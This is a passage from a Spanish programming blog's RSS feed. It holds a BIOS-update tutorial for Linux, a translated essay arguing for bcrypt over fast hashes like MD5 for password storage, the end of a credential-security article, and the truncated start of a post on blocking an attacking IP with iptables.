&lt;p&gt;Lo último que una empresa desea es aparecer en una lista de las &lt;a href=&#34;http://www.darkreading.com/database/5-big-database-breaches-of-spring-2013/240155864&#34; target=&#34;_blank&#34;&gt;mayores brechas de seguridad&lt;/a&gt;. Tratar de controlar el acceso a datos (o credenciales) puede ser todo un reto. Sin un sólido control de acceso, una brecha puede ocurrir rápidamente al olvidar cambiar una contraseña o al no restringir desde donde puede un usuario loggearse. Muchas organizaciones fallan a la hora de limitar los privilegios de sus empleados, no disponen de métodos de autentificación lo suficientemente robustos o, en algunos casos, simplemente no protegen los datos y recursos críticos. Sin centrarse en cómo fluyen los datos de una empresa a otra, y quién puede acceder a ellos en cada momento, la información puede terminar rápidamente en manos de un atacante.&lt;/p&gt;

&lt;h1 id=&#34;conclusión&#34;&gt;Conclusión&lt;/h1&gt;

&lt;p&gt;Como hemos ido viendo a lo largo del artículo, hay muchas formas en las que un atacante puede hacerse con nuestros datos, está claro que con una contraseña no estamos protegidos, así que lo recomendable es usar, siempre que se pueda, otra capa de seguridad como la &lt;a href=&#34;https://elbauldelprogramador.com/todos-los-lugares-donde-deberias-habilitar-autenticacion-de-dos-factores-ahora-mismo/&#34; title=&#34;Todos los lugares donde deberías habilitar la Autenticación de Dos Factores ahora mismo&#34;&gt;autentificación de dos factores&lt;/a&gt;. Además, para generar contraseñas bastante fuertes es posible usar webs como &lt;a href=&#34;http://passwordsgenerator.net/&#34; target=&#34;_blank&#34;&gt;passwordsgenerator.net&lt;/a&gt;. El problema de este tipo de contraseñas es que son imposibles de recordar. Una solución es guardarlas en un fichero de texto y encriptarlas con &lt;a href=&#34;https://elbauldelprogramador.com/editar-y-crear-archivos-cifrados-con-gpg-en-vim/&#34; title=&#34;Editar y crear archivos cifrados con GPG en Vim&#34; target=&#34;_blank&#34;&gt;GPG&lt;/a&gt;.&lt;/p&gt;

&lt;h1 id=&#34;referencias&#34;&gt;Referencias&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;&lt;em&gt;blog.duosecurity.com&lt;/em&gt; »» &lt;a href=&#34;https://blog.duosecurity.com/2013/06/7-ways-cybercriminals-steal-or-defeat-login-credentials-2/&#34; target=&#34;_blank&#34;&gt;7 Ways Cybercriminals Steal or Defeat Login Credentials&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
        </item>
        
        <item>
            <title>Actualizar BIOS de ASUS desde Linux</title>
            <link>https://elbauldelprogramador.com/actualizar-bios-de-asus-desde-linux/</link>
            <pubDate>Fri, 01 Jan 2016 00:00:00 +0000</pubDate>
            
            <guid>https://elbauldelprogramador.com/actualizar-bios-de-asus-desde-linux/</guid>
            <description>&lt;p&gt;Toda esta historia viene al comprar una memória de 2Gb de Ram a mi pc, para aumentar la capacidad total a 4Gb, no parece que sea algo muy complicado, ya que supuestamente mi placa base soporta hasta 8Gb y uso un Sistema Operatívo de 64-bits (CrunchBang 64-bit Stable + backports).&lt;/p&gt;

&lt;p&gt;Bueno, inserto la RAM en la placa base todo contento ya que ahora iba a tener 4Gb (2x1Gb y 1x2Gb) y no se mi iba a quedar colgado el pc mientras escucho música con el Eclipse abierto más el emulador Android y el Chrome&amp;#8230; (Que se come la RAM que da gusto), y resulta que solo reconoce 3Gb&amp;#8230; Tras una tarde de buscar por foros y no encontrar nada me decido a publicar mi problema en los foros de &lt;a href=&#34;http://crunchbanglinux.org/forums/post/192843/#p192843&#34;&gt;cruchbang&lt;/a&gt; y &lt;a href=&#34;http://forums.debian.net/viewtopic.php?f=7&amp;amp;t;=76419&#34;&gt;debian&lt;/a&gt;. Al principio pensaba que era un problema de que no estaba colocando las memórias en los canales correctos para que hiciera el dual channel. Pero ese no era el problema.&lt;/p&gt;

&lt;p&gt;Tras una respuesta en uno de los foros miro a ver si la BIOS reconoce las 4Gb y el resultado es que solo reconoce 3Gb. Investigo el motivo por el cual solo reconoce 3Gb y llego a una página que dice que es un problema de la versión de la BIOS que se soluciona actualizando a la última versión. Así que voy a explicar el proceso de actualización de la BIOS, en mi caso para la placa base ASUS P5B Deluxe Wifi edition:&lt;/p&gt;

&lt;p&gt;&lt;!--ad--&gt;&lt;/p&gt;

&lt;p&gt;Lo primero que hay que hacer es bajarse el archivo de la página de ASUS, lo descomprimimos y tenemos un archivo con el modelo de la placa y de extensión .rom.&lt;/p&gt;

&lt;p&gt;El siguiente paso es insertar un usb que formatearemos para realizar la actualización. Una vez insertado lo desmontamos y ejecutamos lo siguiente:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;fdisk -cu /dev/sdb

Command &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;m &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;help&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;: p

Disk /dev/sdb: &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; MB, &lt;span class=&#34;m&#34;&gt;1002438656&lt;/span&gt; bytes
&lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; heads, &lt;span class=&#34;m&#34;&gt;62&lt;/span&gt; sectors/track, &lt;span class=&#34;m&#34;&gt;1018&lt;/span&gt; cylinders, total &lt;span class=&#34;m&#34;&gt;1957888&lt;/span&gt; sectors
&lt;span class=&#34;nv&#34;&gt;Units&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; sectors of &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; * &lt;span class=&#34;nv&#34;&gt;512&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;512&lt;/span&gt; bytes
Sector size &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;logical/physical&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;512&lt;/span&gt; bytes / &lt;span class=&#34;m&#34;&gt;512&lt;/span&gt; bytes
I/O size &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;minimum/optimal&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;512&lt;/span&gt; bytes / &lt;span class=&#34;m&#34;&gt;512&lt;/span&gt; bytes
Disk identifier: 0x00025eb4

   Device Boot      Start         End      Blocks   Id  System
/dev/sdb1   *          &lt;span class=&#34;m&#34;&gt;62&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1956595&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;978267&lt;/span&gt;    c  W95 FAT32 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;LBA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;El siguiete paso es formatearlo:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;mkfs.msdos -F &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; /dev/sdb1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Despues de esto, retiramos el usb y lo volvemos a introducir en el puerto. Si se monta automáticamente, lo desmontamos. Una vez desmontado, lo montamos con el siguiente comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;mount /dev/sdb1 /mnt/temp/ -o rw,flush,uid&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1000,utf8,shortname&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;win95
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Copiamos el archivo ROM de la bios dentro del USB (Asegúrate de que el nombre del archivo está en mayúsculas.)&lt;/p&gt;

&lt;p&gt;Desmontamos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;umount /dev/sdb1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Ahora reiniciamos con el usb insertado y tan pronto como veamos la pantalla de la BIOS pulsamos Alt+F2 para empezar el proceso de actualización. Seleccionamos el archivo ROM y esperamos a que finalize el proceso.&lt;/p&gt;

&lt;p&gt;Despues de actualizar la BIOS, se restauran las configuraciones por defecto, de modo que es necesario volver a configurar la BIOS con los parámetros que deseemos.&lt;/p&gt;

&lt;p&gt;&lt;a target=&#34;_blank&#34; href=&#34;http://www.blakeanthonyjohnson.com/?p=170&#34;&gt;Fuente original&lt;/a&gt;&lt;/p&gt;</description>
        </item>
        
        <item>
            <title>Basta con las Tablas Arcoiris: lo que necesitas saber sobre esquemas de contraseñas seguras</title>
            <link>https://elbauldelprogramador.com/basta-con-las-tablas-arcoiris-lo-que-necesitas-saber-sobre-esquemas-de-contrasenas-seguras/</link>
            <pubDate>Fri, 01 Jan 2016 00:00:00 +0000</pubDate>
            
            <guid>https://elbauldelprogramador.com/basta-con-las-tablas-arcoiris-lo-que-necesitas-saber-sobre-esquemas-de-contrasenas-seguras/</guid>
            <description>&lt;p&gt;
&lt;a href=&#34;https://elbauldelprogramador.com/img/2012/08/rainbow1.png&#34;&gt;&lt;img on=&#34;tap:lightbox1&#34; role=&#34;button&#34; tabindex=&#34;0&#34; layout=&#34;responsive&#34; class=&#34;wp-image-901 aligncenter&#34; title=&#34;rainbow&#34; alt=&#34;&#34; src=&#34;https://elbauldelprogramador.com/img/2012/08/rainbow1.png&#34; width=&#34;536px&#34; height=&#34;303px&#34; /&gt;&lt;/a&gt;
&lt;/p&gt;

&lt;p&gt;En la esfera social de bookmark (&amp;#8220;socialbookmarkosphere&amp;#8221;) se habla &lt;a href=&#34;http://kestas.kuliukas.com/RainbowTables/&#34;&gt;insistentemente&lt;/a&gt; de las &amp;#8220;&lt;a href=&#34;http://www.codinghorror.com/blog/2007/09/rainbow-hash-cracking.html&#34; target=&#34;_blank&#34;&gt;Tablas Arcoiris&lt;/a&gt;&amp;#8220;, cuál es el significado real de &lt;em&gt;password security&lt;/em&gt;, y por qué demuestran que Microsoft hizo un trabajo de mala calidad en la seguridad de &lt;em&gt;Windows for Workgroups&lt;/em&gt; hace 15 años. Esto realmente me enloquece. Si el eje soporte &amp;#8220;avanzado&amp;#8221; de tu modelo de amenazas es &amp;#8220;Tablas Arcoiris&amp;#8221;, deja de trabajar en tu aplicación &lt;em&gt;Calendario Social de Compras&lt;/em&gt; ahora mismo: no puedo confiar en ti con mi Reddit karma score, y mucho menos el número de mi tarjeta de crédito.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Para comenzar, almacenamiento de contraseñas 101&lt;/strong&gt;: Los servidores &lt;a title=&#34;Cómo se almacenan tus contraseñas en internet (y cuando la longitud de la misma no importa)&#34; href=&#34;https://elbauldelprogramador.com/como-se-almacenan-tus-contrasenas-en-internet-y-cuando-la-longitud-de-la-misma-no-importa/&#34; target=&#34;_blank&#34;&gt;no suelen almacenar las contraseñas reales&lt;/a&gt;. En su lugar, encriptan la contraseña, guardan el hash, y descartan la contraseña. El valor del hash puede verificar una contraseña de una página de login, pero no puede ser revertido de nuevo al valor de la contraseña. Por lo tanto cuando inevitablemente pierdes tu tabla de contraseñas SQL, no se han expuesto todas las contraseñas; sólo lo residual.&lt;/p&gt;

&lt;p&gt;Ahora re-expliquemos las Tablas Arcoiris:
&lt;!--ad--&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Toma un &amp;#8220;diccionario&amp;#8221; - por ejemplo, todas las combinaciones de caracteres alfanuméricos con menos de 15 caracteres.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Encríptalas a todas.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Graba los resultados en un DVD.&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Ahora tienes cientos de billones de valores hash que pueden revertirse al valor original - una &amp;#8220;tabla arcoiris&amp;#8221;. Para usarla,&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Toma tu tabla de hashes robada&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;por cada hash&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;búscala en la tabla arcoiris&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Si está allí, lo resolviste.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Lo que necesitas saber sobre Tablas Arcoiris: ningún esquema moderno de &lt;strong&gt;contraseñas&lt;/strong&gt; es vulnerable a ellos.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Las Tablas Arcoiris son de fácil acierto. Para cada clave, genera un número aleatorio (un &amp;#8216;&lt;em&gt;nonce&amp;#8217;&lt;/em&gt;). Genera el hash de la contraseña con el nonce, y almacena ambos valores. El servidor dispone de información suficiente para verificar contraseñas (el nonce se guarda descubierto). Pero incluso con un pequeño valor aleatorio, digamos, 16 bits, las tablas arcoiris son inviables: en la actualidad hay 65.536 &amp;#8220;variantes&amp;#8221; de cada hash, y en vez de 300 billones de entradas en la tabla arcoiris, necesitas cuatrillones. El nonce en este esquema se llama &amp;#8220;salt&amp;#8221; (sal).&lt;/p&gt;

&lt;p&gt;Genial, ¿no? Sí, y la &lt;a href=&#34;http://en.wikipedia.org/wiki/Crypt_%28Unix%29&#34; target=&#34;_blank&#34;&gt;criptografía Unix&lt;/a&gt; - casi el &lt;em&gt;mínimo común denominador&lt;/em&gt; en sistemas de seguridad - ha tenido esta característica &lt;a href=&#34;http://static.usenix.org/events/usenix99/provos/provos_html/node9.html&#34; target=&#34;_blank&#34;&gt;desde 1976&lt;/a&gt;. Si esto son novedades para tí, no deberías estar diseñando sistemas de contraseñas. Usa alguna buena de otro.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;No, en serio. &lt;a href=&#34;http://www.openwall.com/john/interviews/SF-20060222-p3&#34; target=&#34;_blank&#34;&gt;Usa algún sistema de contraseñas de otro&lt;/a&gt;. No construyas uno propio.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;La mayoría de los peores problemas de seguridad de la industria (como el famoso y deficiente hash LANMAN) sucedieron porque inteligentes desarrolladores enfocaron el código de seguridad de la misma forma que hicieron el resto del código. La diferencia entre el código de seguridad y el código de la aplicación es que cuando el de la aplicación falla, lo descubres en el momento, pero cuando falla el de seguridad, te enteras 4 años más tarde, cuando un DVD con todos los códigos de tarjetas de crédito de tus clientes y la información CVV2 comienza a circular en Estonia.&lt;/p&gt;

&lt;p&gt;Aquí hay un esquema de vanguardia de un post reciente de un blog sobre Tablas Arcoiris y Salts:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;hash = md5(&#39;deliciously-salty-&#39; + password)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Hay al menos dos problemas con este código. Sí, el autor no sabe que es un salt; &amp;#8220;deliciously-salty-&amp;#8221; is not a nonce (además, Jeff, a tu computadora realmente no le interesa si separas la contraseña de el nonce con un guión; es una computadora, no una maestra de 2do grado).&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Pero hay un problema mucho mayor con este código: las letras &amp;#8220;md5&amp;#8243;.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;**Dos razones.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Estás esperando que haga una crítica severa acerca de cómo no hay &lt;a href=&#34;http://www.reddit.com/r/programming/comments/2fu8q/we_worship_md5_the_god_of_hash/c2fwf2&#34; target=&#34;_blank&#34;&gt;ninguna cualidad redentora&lt;/a&gt; para justificar &lt;a href=&#34;http://www.skrenta.com/2007/08/md5_tutorial.html&#34; target=&#34;_blank&#34;&gt;el uso de MD5 en 2007&lt;/a&gt;. Eso es cierto (MD5 está roto, es demasiado lento para usarlo como un hash de propósito general, etc.) Pero ese no es el problema.&lt;/li&gt;
&lt;li&gt;El problema es que MD5 es rápido. Entonces lo son sus competidores modernos, como SHA1 y SHA256. &lt;a href=&#34;http://cr.yp.to/hash127/faq.html&#34; target=&#34;_blank&#34;&gt;La velocidad es un propósito de diseño&lt;/a&gt; de un hash seguro moderno, debido a que los hashes son bloques de construcción de casi todos los sistemas criptográficos, y usualmente tienen &amp;#8216;demanda de ejecución&amp;#8217; de nivel &amp;#8216;por paquete&amp;#8217; o &amp;#8216;por mensaje&amp;#8217;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;La velocidad es exactamente lo que no quieres en una función de hash de contraseñas.&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Los esquemas modernos de contraseñas son atacados con cracker de contraseñas incrementales. Crackers incrementales no precalculan todas las posibles contraseñas crackeadas. Consideran cada hash de contraseña individualmente, y alimentan su diccionario a través de la función de hash de contraseña de la misma manera que tu página de login de PHP lo haría. A los crackers de Tablas Arcoiris les gusta que Ophcrack use espacio para atacar contraseñas; los crackers incrementales como John the Ripper, Crack y LC5 trabajan con tiempo: estadísticas y cómputo.&lt;/li&gt;
&lt;li&gt;En el juego de atacar contraseñas se gana puntos según el tiempo consumido para crackear una contraseña X. Con las tablas arcoiris, ese tiempo depende de qué tan grande tu tabla necesita ser y que tan rápido puedes buscarla. Con crackers incrementales, el tiempo depende de qué tan rápido puedes hacer correr tu función de hash de contraseñas.&lt;/li&gt;
&lt;li&gt;Cuanto más puedas optimizar tu función, más rápida se vuelva, más debil tu esquema es. MD5 y SHA1, incluso cifradores de bloque convencionales como DES, son diseñados para ser rápidos. MD5, SHA1 y DES son hasheadores de contraseña débiles. En las CPU modernas, crudos bloques de construcción encriptada como DES y MD5 pueden ser&lt;a href=&#34;http://citeseer.ist.psu.edu/cache/papers/cs/5811/http:zSzzSzwww.dmi.ens.frzSz~porninzSzbitslice.pdf/pornin99automatic.pdf&#34; target=&#34;_blank&#34;&gt; separados en bits&lt;/a&gt;, &lt;a href=&#34;http://www.openwall.com/john/doc/CHANGES.shtml&#34; target=&#34;_blank&#34;&gt;vectorizados y paralelizados&lt;/a&gt; para hacer búsquedas de contraseña rápidas como un rayo. Dejar &lt;a href=&#34;http://www.east.isi.edu/~bschott/pubs/grembowski02comparative.pdf&#34; target=&#34;_blank&#34;&gt;fuera de juego a las implementaciones FPGA&lt;/a&gt; costó sólo cientos de dólares.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Usar funciones hash caseras para autenticar las contraseñas es tan ingenuo como usar funciones hash salt. No lo hagas.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;¿Qué es lo nuevo aquí?&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Primero, lo que tu sistema operativo ya te da&lt;/strong&gt;: un esquema de contraseñas &amp;#8220;optimizado&amp;#8221; para ser computacionalmente caro. El más famoso de estos es el esquema FreeBSD MD5 de &lt;a href=&#34;http://en.wikipedia.org/wiki/Poul-Henning_Kamp&#34; target=&#34;_blank&#34;&gt;PHK&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;La diferencia entre el esquema de PHK y el que estabas por usar para tu carrito de compras 2.0 es simple. Estabas por aplicar MD5 en un salt y la contraseña y luego guardar el hash. PHK aplica MD5 por miles de iteraciones. Ésto es lo que llamamos &amp;#8220;&lt;em&gt;stretching&lt;/em&gt;&amp;#8221; (extenderse).&lt;/li&gt;
&lt;li&gt;El esquema MD5 de PHK es sencillo de codificar y está incluido en los sistemas operativos Linux y BSD. Si tienes que elegir entre el código PHP que tienes y el esquema de PHK, elige el de PHK o fallarás la auditoría PCI. [*]&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;La respuesta más simple es &amp;#8220;hashing adaptativo&amp;#8221;&lt;/strong&gt;(adaptive hashing), el cual Neils Provos y David Mazieres inventaron para OpenBSD en 1999. Su esquema original&lt;a href=&#34;http://www.usenix.org/events/usenix99/provos/provos_html/node1.html&#34; target=&#34;_blank&#34;&gt; es llamado &amp;#8220;bcrypt&lt;/a&gt;&amp;#8220;, pero la idea es más importante que el algoritmo.&lt;/p&gt;

&lt;p&gt;Hay tres grandes diferencias entre Provos-Mazieres y el esquema de PHK:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Bcrypt fue inventado por dos hombres inteligentes y el de PHK fue&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;inventado sólo por un hombre inteligente. Eso es literalmente el doble de inteligente.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;ol&gt;
&lt;li&gt;Bcrypt usa Blowfish en lugar de MD5. Blowfish es un cifrador en bloque con un notoriamente caro tiempo de configuración. Optimizar Blowfish para que sea más rápido, tendrías que contribuir con un importante avance en la criptografía. Nuestros practicantes de seguridad son todos &amp;#8220;apostadores&amp;#8221;, y usualmente nos gusta apostar a lo que nos &amp;#8220;demande importantes avances en criptografía&amp;#8221;.&lt;/li&gt;
&lt;li&gt;Provos y Mazieres extendieron Blowfish. Se llaman los suyos: &amp;ldquo;Eksblowfish&amp;rdquo;. Eksblowfish es más deplorable: el tiempo de configuración tarda más que Blowfish. ¿Cuánto más? &lt;em&gt;Tu llamado.&lt;/em&gt; Puedes hacer que un intento con contraseña simple lleve milisegundos, o puedes hacer que tarde horas.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;¿Por qué bcrypt es como un gran acierto? Piensa en el problema desde dos perspectivas: el servidor, y el atacante.&lt;/p&gt;

&lt;p&gt;Primero, el servidor: tienes decenas de miles de logins por hora, o decenas por segundo. Comparado con los impactos en la base de datos y los refrescos de página y E/S, el checkeo de contraseña es despreciable. No te preocupes si tu testeo de contraseña tarda el doble de tiempo, o incluso diez veces más, porque los hash no caen dentro del rango &lt;sup&gt;80&lt;/sup&gt;&amp;frasl;&lt;sub&gt;20&lt;/sub&gt;.&lt;/p&gt;

&lt;p&gt;Ahora, el atacante. Esto es fácil. El atacante se preocupa mucho si los tests de contraseña toman el doble de tiempo. Si un testeo de contraseña tarda el doble, el tiempo total de crackeo de contraseña tarda también el doble.&lt;/p&gt;

&lt;p&gt;¿Comprendes?&lt;/p&gt;

&lt;p&gt;La mayor ventaja del hashing adaptativo es que puedes ajustarlo. De la misma forma que las computadoras son cada vez más rápidas, el mismo bloque de código continúa produciendo contraseñas que son difíciles de crackear.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Finalmente, como tu abogado en este asunto, me veo obligado a informarte sobre SRP.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;SRP es el protocolo de Contraseña Remota Segura de Stanford (&lt;a href=&#34;http://srp.stanford.edu/design.html&#34; target=&#34;_blank&#34;&gt;Stanford Secure Remote Password&lt;/a&gt; protocol). Es un sistema de criptografía de clave pública diseñado para almacenar y validar contraseñas de forma segura sin guardarlas o transmitirlas sin cifrar.&lt;/p&gt;

&lt;p&gt;Este objetivo de diseño es mucho mejor de lo que suena, ya que hay usualmente algunas cuestiones inevitables en el diseño de sistemas de contraseñas:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Puedes guardar el hash de la contraseña. Ahora si pierdes la base de datos de contraseñas, no expones las contraseñas efectivas. No obstante, tampoco tú sabes el valor real de las contraseñas, lo que significa que para validarlas, tus clientes necesitan enviártelas sin encriptar.&lt;/li&gt;
&lt;li&gt;Puedes usar un esquema de desafío-respuesta (&lt;em&gt;challenge-response)&lt;/em&gt;, donde ambos lados usan un problema matemático para demostrarse entre sí que conocen la contraseña, pero ninguno de los dos lados envía la contraseña sobre la red. Estos esquemas son buenos, pero no funcionan si ambos lados no tienen acceso al valor real de la contraseña – en otras palabras, el servidor tiene que almacenarla sin encriptar.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;La mayoría de los practicantes elegirán el esquema de hashing. Ambos ataques – robo de bases de datos y contraseñas robadas por &lt;em&gt;phishing –&lt;/em&gt; ocurren todo el tiempo. Pero las bases de datos robadas comprometen más contraseñas.&lt;/p&gt;

&lt;p&gt;SRP resuelve las compensaciones. Es una extensión de Diffie-Hellman. El detalle destacado de esta publicación: en lugar de almacenar un hash de la contraseña con &lt;em&gt;salt&lt;/em&gt;, almacenas un “verificador”, el cual es un número elevado a la (obviamente muy grande) potencia del módulo N del hash de la contraseña.&lt;/p&gt;

&lt;p&gt;Si entiendes DH, SRP simplemente va a tener sentido para ti. Si no, &lt;a href=&#34;http://en.wikipedia.org/wiki/Diffie-Hellman&#34; target=&#34;_blank&#34;&gt;Wikipedia te explicará mejor que yo&lt;/a&gt;. Para la prueba del próximo miércoles, necesitas saber:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;SRP está relacionado con Diffie-Hellman.&lt;/li&gt;
&lt;li&gt;SRP es un protocol &lt;em&gt;desafío-respuesta&lt;/em&gt; que permite al servidor que demuestre que sabes la contraseña sin que la misma se inserte en la red.&lt;/li&gt;
&lt;li&gt;SRP no require que almacenes las contraseñas en texto plano; sino que las guardas en un verificador criptográfico no-revertible.&lt;/li&gt;
&lt;li&gt;Los verificadores SRP “Cracking” rápidamente podrían involucrar un avance singificativo a la criptografía.&lt;/li&gt;
&lt;li&gt;SRP es lo suficientemente simple para correr sin Javascript.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;¡Increíble! ¿Por qué no estás usando SRP en este preciso momento? Te dare tres razones:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;SRP está patentado&lt;/li&gt;
&lt;li&gt;Para hacerlo funcionar de forma segura en un navegador, tienes que cubrir la página de login sobre SSL; de otra forma, &lt;a href=&#34;http://www.matasano.com/log/251/oh-meebo/&#34; target=&#34;_blank&#34;&gt;como Meebo&lt;/a&gt;, te enredarás en un esquema que puede ser mordido por cualquiera que pueda hacer *phishing *una página web.&lt;/li&gt;
&lt;li&gt;SRP es fácil de estropear, por lo que los primeros N mainstreams de Rails o PHP o las implementaciones Pylons SRP serán trivialmente bypassables por al menos el primer año hasta que sean implementadas.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;¿Qué hemos aprendido?&lt;/p&gt;

&lt;p&gt;Aprendimos que si es 1975, puedes incendiar ARPANet con un ataque de Tabla arcoiris. Si es 2007, un ataque de ese tipo te incendia a tí, aprendimos que deberías volver a 1975 y esperar 30 años antes de intentar diseñar un esquema de hashing de contraseñas.&lt;/p&gt;

&lt;p&gt;Aprendimos que si hemos aprendido algo de este post, deberíamos consultar a nuestros amigos y vecinos en el campo de seguridad pidiendo ayuda con nuestros esquemas de contraseñas, porque nadie va a encontrar el error que termine el juego de nuestros esquemas MD5 hasta el momento después de que el número de tarjeta de crédito de mi madre sea vendido en un puesto de ruta en Tallinn, Estonia.&lt;/p&gt;

&lt;p&gt;Aprendimos que en un esquema de hashing de contraseñas, la velocidad es el enemigo. Aprendimos que MD5 fue diseñado para velocidad. Entonces, aprendimos que MD5 es el enemigo. También Jeff Atwood y Richard Skrenta.&lt;/p&gt;

&lt;p&gt;Finalmente, aprendimos que si queremos almacenar contraseñas en forma segura tenemos tres opciones razonables: el esquema MD5 de PHK, el esquema Bcrypt de Provos-Maziere y SRP. Aprendimos que la opción correcta es Bcrypt.&lt;/p&gt;

&lt;p&gt;[∗] &lt;em&gt;Disclaimer: I cannot actually flunk your PCI audit.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Fuente | &lt;a href=&#34;http://chargen.matasano.com/chargen/2007/9/7/enough-with-the-rainbow-tables-what-you-need-to-know-about-s.html&#34; target=&#34;_blank&#34;&gt;Matasano Security&lt;/a&gt;&lt;/p&gt;</description>
        </item>
        
        <item>
            <title>Bloquear una IP atacando el servidor mediante iptables</title>
            <link>https://elbauldelprogramador.com/bloquear-una-ip-atacanto-el-servidor-mediante-iptables/</link>
            <pubDate>Fri, 01 Jan 2016 00:00:00 +0000</pubDate>
            
            <guid>https://elbauldelprogramador.com/bloquear-una-ip-atacanto-el-servidor-mediante-iptables/</guid>
            <description>&lt;p&gt;&lt;img on=&#34;tap:lightbox1&#34; role=&#34;button&#34; tabindex=&#34;0&#34; layout=&#34;responsive&#34; src=&#34;https://elbauldelprogramador.com/img/2013/02/Applic-Firewall-icon.png&#34; alt=&#34;Applic-Firewall-icon&#34; width=&#34;256px&#34; height=&#34;256px&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Ayer ojeando el archivo de log detecté que había una ip mandando peticiones POST indiscriminadamente a la página de login del blog y decidí investigar un poco.&lt;/p&gt;

&lt;p&gt;Por la frecuencia con las que se realizaban las peticiones debía ser un ataque automatizado, y probaba cadenas de texto aleatorias, lo primero que hice fué bloquear a dicha ip cualquier intento de conexión al servidor mediante &lt;a href=&#34;https://elbauldelprogramador.com/?s=iptables&#34;&gt;iptables&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Además de bloquearlo, añadí una regla a las directivas de iptables para que quedara registrado en el log cada intento de conexión. Las reglas en cuestión son las siguientes:&lt;/p&gt;

&lt;p&gt;&lt;!--ad--&gt;&lt;/p&gt;
